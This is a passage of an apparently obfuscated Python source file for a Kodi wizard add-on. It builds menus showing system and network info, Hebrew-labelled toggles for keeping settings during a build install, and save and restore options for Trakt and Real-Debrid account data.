	OO0O00O0OO000O00O =OOO0O0O00OOOOOO0O [8 ]if 'Una'in OOO0O0O00OOOOOO0O [8 ]else wiz .convertSize (int (float (OOO0O0O00OOOOOO0O [8 ][:-8 ]))*1024 *1024 )#line:2768
	O0OOOO0O00OO00OOO =OOO0O0O00OOOOOO0O [9 ]if 'Una'in OOO0O0O00OOOOOO0O [9 ]else wiz .convertSize (int (float (OOO0O0O00OOOOOO0O [9 ][:-8 ]))*1024 *1024 )#line:2769
	OOO0O00000OOOOOO0 =OOO0O0O00OOOOOO0O [10 ]if 'Una'in OOO0O0O00OOOOOO0O [10 ]else wiz .convertSize (int (float (OOO0O0O00OOOOOO0O [10 ][:-8 ]))*1024 *1024 )#line:2770
	OOOO0OO0OO0OO00O0 =wiz .convertSize (int (float (OOO0O0O00OOOOOO0O [11 ][:-2 ]))*1024 *1024 )#line:2771
	O0OOO0O00OO00O0OO =wiz .convertSize (int (float (OOO0O0O00OOOOOO0O [12 ][:-2 ]))*1024 *1024 )#line:2772
	OOO00O00OOO0OOOOO =wiz .convertSize (int (float (OOO0O0O00OOOOOO0O [13 ][:-2 ]))*1024 *1024 )#line:2773
	O000OOOO0O0O00O0O ,OOO000OOO00OOO0O0 ,O000OOO00OO00OOOO =getIP ()#line:2774
	O0O0OO0OO00O00O0O =[];O0O0OOOO00O000O0O =[];O000O0O00OO00O00O =[];OOO00O0OOOOOO0OOO =[];OO000O000OO000000 =[];O0OO0OO0O0OO0O00O =[];OO00000000OO00O0O =[]#line:2776
	OOO00O00O00O0OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2778
	for O0O0O00O00OOO0O0O in sorted (OOO00O00O00O0OOOO ,key =lambda OO0OOOOOOOOO00OOO :OO0OOOOOOOOO00OOO ):#line:2779
		OO0O000O0O0OO00O0 =os .path .split (O0O0O00O00OOO0O0O [:-1 ])[1 ]#line:2780
		if OO0O000O0O0OO00O0 =='packages':continue #line:2781
		OO000O0OO00O0O00O =os .path .join (O0O0O00O00OOO0O0O ,'addon.xml')#line:2782
		if os .path .exists (OO000O0OO00O0O00O ):#line:2783
			OOO000O00OO000OOO =open (OO000O0OO00O0O00O )#line:2784
			OO0OOOOO0OO00OO00 =OOO000O00OO000OOO .read ()#line:2785
			OOO0000OO00O000OO =re .compile ("<provides>(.+?)</provides>").findall (OO0OOOOO0OO00OO00 )#line:2786
			if len (OOO0000OO00O000OO )==0 :#line:2787
				if OO0O000O0O0OO00O0 .startswith ('skin'):OO00000000OO00O0O .append (OO0O000O0O0OO00O0 )#line:2788
				if OO0O000O0O0OO00O0 .startswith ('repo'):OO000O000OO000000 .append (OO0O000O0O0OO00O0 )#line:2789
				else :O0OO0OO0O0OO0O00O .append (OO0O000O0O0OO00O0 )#line:2790
			elif not (OOO0000OO00O000OO [0 ]).find ('executable')==-1 :OOO00O0OOOOOO0OOO .append (OO0O000O0O0OO00O0 )#line:2791
			elif not (OOO0000OO00O000OO [0 ]).find ('video')==-1 :O000O0O00OO00O00O .append (OO0O000O0O0OO00O0 )#line:2792
			elif not (OOO0000OO00O000OO [0 ]).find ('audio')==-1 :O0O0OOOO00O000O0O .append (OO0O000O0O0OO00O0 )#line:2793
			elif not (OOO0000OO00O000OO [0 ]).find ('image')==-1 :O0O0OO0OO00O00O0O .append (OO0O000O0O0OO00O0 )#line:2794
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2796
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OOOOOO0O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2797
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OOOOOO0O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2798
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2799
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OOOOOO0O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2800
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OOOOOO0O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2801
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2803
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OOOOOO0O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2804
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OOOOOO0O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2805
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2807
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00O0OO000O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2808
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO0O00OO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2809
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O00000OOOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2810
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2812
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OO0OO0OO00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2813
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O00OO00O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2814
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2815
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2817
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OOOOOO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2818
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO0O0O00O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2819
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000OOO00OOO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2820
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOO00OO00OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2821
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00OOOOOO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2822
	O0OO0OOO00000OOOO =len (O0O0OO0OO00O00O0O )+len (O0O0OOOO00O000O0O )+len (O000O0O00OO00O00O )+len (OOO00O0OOOOOO0OOO )+len (O0OO0OO0O0OO0O00O )+len (OO00000000OO00O0O )+len (OO000O000OO000000 )#line:2824
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0OO0OOO00000OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2825
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0O00OO00O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2826
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00O0OOOOOO0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2827
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OOOO00O000O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2828
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO0OO00O00O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2829
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000O000OO000000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2830
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00000000OO00O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2831
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0OO0O0OO0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2832
def Menu ():#line:2833
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2834
def saveMenu ():#line:2836
	O00OOO00O0OOO00OO ='[COLOR yellow]מופעל[/COLOR]';OO0OOO0O0O000OOOO ='[COLOR blue]מבוטל[/COLOR]'#line:2838
	O0OOOO0OOO0O0OO0O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2839
	OOOO0OO0OOO0OOOOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:2840
	OO0OOO00O0OOOO0O0 ='true'if KEEPINFO =='true'else 'false'#line:2841
	O0000OO0OOOOOOO00 ='true'if KEEPSOUND =='true'else 'false'#line:2843
	O000OO0OOO000O0OO ='true'if KEEPVIEW =='true'else 'false'#line:2844
	O000000OO0O00OOOO ='true'if KEEPSKIN =='true'else 'false'#line:2845
	OOOO0O00OO0000OO0 ='true'if KEEPSKIN2 =='true'else 'false'#line:2846
	OO0O00O0O0O0OO0OO ='true'if KEEPSKIN3 =='true'else 'false'#line:2847
	O0OO000OO0O000000 ='true'if KEEPADDONS =='true'else 'false'#line:2848
	OOO00O00O0000O0O0 ='true'if KEEPPVR =='true'else 'false'#line:2849
	O0O0000OO0O000OO0 ='true'if KEEPTVLIST =='true'else 'false'#line:2850
	OO0OOOOOOO00O0O00 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2851
	OO0O000O00O000O0O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2852
	O0O0OO0OO0O00O000 ='true'if KEEPHUBTV =='true'else 'false'#line:2853
	OO0O0O0000OOO00O0 ='true'if KEEPHUBVOD =='true'else 'false'#line:2854
	O00OOOOOOO0OO0OOO ='true'if KEEPHUBSPORT =='true'else 'false'#line:2855
	O0O0O0O0OOOOOO0O0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:2856
	OOO000OO0OO00O0OO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2857
	O0O0OO000O0OO0O0O ='true'if KEEPHUBMENU =='true'else 'false'#line:2858
	O000OO0O00O00OOO0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:2859
	OOOOO000OO00O0000 ='true'if KEEPTRAKT =='true'else 'false'#line:2860
	O000O0000000O0OOO ='true'if KEEPREAL =='true'else 'false'#line:2861
	OO0O0OOOO0OOO0OOO ='true'if KEEPRD2 =='true'else 'false'#line:2862
	OO0OO000000O00O0O ='true'if KEEPTORNET =='true'else 'true'#line:2863
	OO0O0000000OOO00O ='true'if KEEPLOGIN =='true'else 'false'#line:2864
	OO000O000OO000OO0 ='true'if KEEPSOURCES =='true'else 'false'#line:2865
	O000O0OO0O0O000O0 ='true'if KEEPADVANCED =='true'else 'false'#line:2866
	OOO00OO00OO0O00O0 ='true'if KEEPPROFILES =='true'else 'false'#line:2867
	OO0OO0000O00O000O ='true'if KEEPFAVS =='true'else 'false'#line:2868
	O0000O0OO00O0OO00 ='true'if KEEPREPOS =='true'else 'false'#line:2869
	OOOO000000O0OOO0O ='true'if KEEPSUPER =='true'else 'false'#line:2870
	O00OO0O00O0OOOOOO ='true'if KEEPWHITELIST =='true'else 'false'#line:2871
	OOO0O0O0O00OOO000 ='true'if KEEPWEATHER =='true'else 'false'#line:2872
	if O00OO0O00O0OOOOOO =='true':#line:2876
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2877
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2878
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2879
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2880
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2881
	addFile ('%s התקנת קיר סרטים: '%O0OOOO0OOO0O0OO0O .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2883
	addFile ('%s שמירת חשבון RD:  '%O000O0000000O0OOO .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2884
	addFile ('%s שמירת חשבון טראקט:  '%OOOOO000OO00O0000 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2885
	addFile ('%s שמירת מועדפים:  '%OO0OO0000O00O000O .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2888
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOO00O00O0000O0O0 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2889
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0O0000OO0O000OO0 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2890
	addFile ('%s שמירת אריח סרטים:  '%OO0OOOOOOO00O0O00 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2891
	addFile ('%s שמירת אריח סדרות:  '%OO0O000O00O000O0O .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2892
	addFile ('%s שמירת אריח טלויזיה:  '%O0O0OO0OO0O00O000 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2893
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO0O0O0000OOO00O0 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2894
	addFile ('%s שמירת אריח ספורט:  '%O00OOOOOOO0OO0OOO .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2895
	addFile ('%s שמירת אריח ילדים:  '%O0O0O0O0OOOOOO0O0 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2896
	addFile ('%s שמירת אריח מוסיקה:  '%OOO000OO0OO00O0OO .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2897
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0O0OO000O0OO0O0O .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2898
	addFile ('%s שמירת כל האריחים בסקין:  '%O000000OO0O00OOOO .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2899
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOO0O0O0O00OOO000 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:2900
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0OO000OO0O000000 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2906
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%OO0OOO00O0OOOO0O0 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2907
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOOO0OO0OOO0OOOOO .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2910
	addFile ('%s שמירת מקורות וידאו:  '%OO000O000OO000OO0 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2911
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0000OO0OOOOOOO00 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2912
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O000OO0OOO000O0OO .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2914
	addFile ('%s שמירת פליליסט לאודר:  '%O000OO0O00O00OOO0 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2915
	addFile ('%s שמירת הגדרות באפר: '%O000O0OO0O0O000O0 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2920
	addFile ('%s שמירת רשימות ריפו:  '%O0000O0OO00O0OO00 .replace ('true',O00OOO00O0OOO00OO ).replace ('false',OO0OOO0O0O000OOOO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2922
	setView ('files','viewType')#line:2924
def traktMenu ():#line:2926
	OO0O0O0OO0O0O00OO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2927
	O0OO00OO0OO0O0OOO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2928
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2929
	addFile ('Save Trakt Data: %s'%OO0O0O0OO0O0O00OO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2930
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0OO00OO0OO0O0OOO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2931
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2932
	for OO0O0O0OO0O0O00OO in traktit .ORDER :#line:2934
		OOOO0OOOO0OOO0OO0 =TRAKTID [OO0O0O0OO0O0O00OO ]['name']#line:2935
		OO0O0000000OOOOO0 =TRAKTID [OO0O0O0OO0O0O00OO ]['path']#line:2936
		OO0O0OOOO000000O0 =TRAKTID [OO0O0O0OO0O0O00OO ]['saved']#line:2937
		OOO00OOO0O00O0OOO =TRAKTID [OO0O0O0OO0O0O00OO ]['file']#line:2938
		O0O00OO0OOOOOO000 =wiz .getS (OO0O0OOOO000000O0 )#line:2939
		O000O0OOO00000O00 =traktit .traktUser (OO0O0O0OO0O0O00OO )#line:2940
		OO0OO00OOOO0OO000 =TRAKTID [OO0O0O0OO0O0O00OO ]['icon']if os .path .exists (OO0O0000000OOOOO0 )else ICONTRAKT #line:2941
		O0O000000OO000O00 =TRAKTID [OO0O0O0OO0O0O00OO ]['fanart']if os .path .exists (OO0O0000000OOOOO0 )else FANART #line:2942
		OO0OOO0000O00000O =createMenu ('saveaddon','Trakt',OO0O0O0OO0O0O00OO )#line:2943
		OOO0OO00OOOOO00O0 =createMenu ('save','Trakt',OO0O0O0OO0O0O00OO )#line:2944
		OO0OOO0000O00000O .append ((THEME2 %'%s Settings'%OOOO0OOOO0OOO0OO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0O0O0OO0O0O00OO )))#line:2945
		addFile ('[+]-> %s'%OOOO0OOOO0OOO0OO0 ,'',icon =OO0OO00OOOO0OO000 ,fanart =O0O000000OO000O00 ,themeit =THEME3 )#line:2947
		if not os .path .exists (OO0O0000000OOOOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OO00OOOO0OO000 ,fanart =O0O000000OO000O00 ,menu =OO0OOO0000O00000O )#line:2948
		elif not O000O0OOO00000O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0O0O0OO0O0O00OO ,icon =OO0OO00OOOO0OO000 ,fanart =O0O000000OO000O00 ,menu =OO0OOO0000O00000O )#line:2949
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000O0OOO00000O00 ,'authtrakt',OO0O0O0OO0O0O00OO ,icon =OO0OO00OOOO0OO000 ,fanart =O0O000000OO000O00 ,menu =OO0OOO0000O00000O )#line:2950
		if O0O00OO0OOOOOO000 =="":#line:2951
			if os .path .exists (OOO00OOO0O00O0OOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0O0O0OO0O0O00OO ,icon =OO0OO00OOOO0OO000 ,fanart =O0O000000OO000O00 ,menu =OOO0OO00OOOOO00O0 )#line:2952
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0O0O0OO0O0O00OO ,icon =OO0OO00OOOO0OO000 ,fanart =O0O000000OO000O00 ,menu =OOO0OO00OOOOO00O0 )#line:2953
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OO0OOOOOO000 ,'',icon =OO0OO00OOOO0OO000 ,fanart =O0O000000OO000O00 ,menu =OOO0OO00OOOOO00O0 )#line:2954
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2956
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2957
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2958
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2959
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2960
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2961
	setView ('files','viewType')#line:2962
def realMenu ():#line:2964
	O0OOOO0O0O00O000O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2965
	O0OO00OO00O0OOO0O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2966
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2967
	addFile ('Save Real Debrid Data: %s'%O0OOOO0O0O00O000O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2968
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OO00OO00O0OOO0O ),'',icon =ICONREAL ,themeit =THEME3 )#line:2969
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2970
	for OOOO0OO00O00O00OO in debridit .ORDER :#line:2972
		OO00OOOOOOO0OO0OO =DEBRIDID [OOOO0OO00O00O00OO ]['name']#line:2973
		OOO00OO00OOOOOOOO =DEBRIDID [OOOO0OO00O00O00OO ]['path']#line:2974
		O000OO0OOOO0OO0O0 =DEBRIDID [OOOO0OO00O00O00OO ]['saved']#line:2975
		OOO0OOO0000OOO00O =DEBRIDID [OOOO0OO00O00O00OO ]['file']#line:2976
		O00O0O0O000OOO0O0 =wiz .getS (O000OO0OOOO0OO0O0 )#line:2977
		OO0OO0O0O0000O0O0 =debridit .debridUser (OOOO0OO00O00O00OO )#line:2978
		O00OO000O00O00O0O =DEBRIDID [OOOO0OO00O00O00OO ]['icon']if os .path .exists (OOO00OO00OOOOOOOO )else ICONREAL #line:2979
		OOOO00O0O0OOOOO0O =DEBRIDID [OOOO0OO00O00O00OO ]['fanart']if os .path .exists (OOO00OO00OOOOOOOO )else FANART #line:2980
		O0OO00O000000O00O =createMenu ('saveaddon','Debrid',OOOO0OO00O00O00OO )#line:2981
		OO0OOO0O0O00OO0OO =createMenu ('save','Debrid',OOOO0OO00O00O00OO )#line:2982
		O0OO00O000000O00O .append ((THEME2 %'%s Settings'%OO00OOOOOOO0OO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOOO0OO00O00O00OO )))#line:2983
		addFile ('[+]-> %s'%OO00OOOOOOO0OO0OO ,'',icon =O00OO000O00O00O0O ,fanart =OOOO00O0O0OOOOO0O ,themeit =THEME3 )#line:2985
		if not os .path .exists (OOO00OO00OOOOOOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00OO000O00O00O0O ,fanart =OOOO00O0O0OOOOO0O ,menu =O0OO00O000000O00O )#line:2986
		elif not OO0OO0O0O0000O0O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOOO0OO00O00O00OO ,icon =O00OO000O00O00O0O ,fanart =OOOO00O0O0OOOOO0O ,menu =O0OO00O000000O00O )#line:2987
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OO0O0O0000O0O0 ,'authdebrid',OOOO0OO00O00O00OO ,icon =O00OO000O00O00O0O ,fanart =OOOO00O0O0OOOOO0O ,menu =O0OO00O000000O00O )#line:2988
		if O00O0O0O000OOO0O0 =="":#line:2989
			if os .path .exists (OOO0OOO0000OOO00O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOOO0OO00O00O00OO ,icon =O00OO000O00O00O0O ,fanart =OOOO00O0O0OOOOO0O ,menu =OO0OOO0O0O00OO0OO )#line:2990
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOOO0OO00O00O00OO ,icon =O00OO000O00O00O0O ,fanart =OOOO00O0O0OOOOO0O ,menu =OO0OOO0O0O00OO0OO )#line:2991
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0O0O000OOO0O0 ,'',icon =O00OO000O00O00O0O ,fanart =OOOO00O0O0OOOOO0O ,menu =OO0OOO0O0O00OO0OO )#line:2992
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2994
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2995
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2996
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2997
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2998
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2999
	setView ('files','viewType')#line:3000
def loginMenu ():#line:3002
	O0OOO0OOO0OO0O0OO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3003
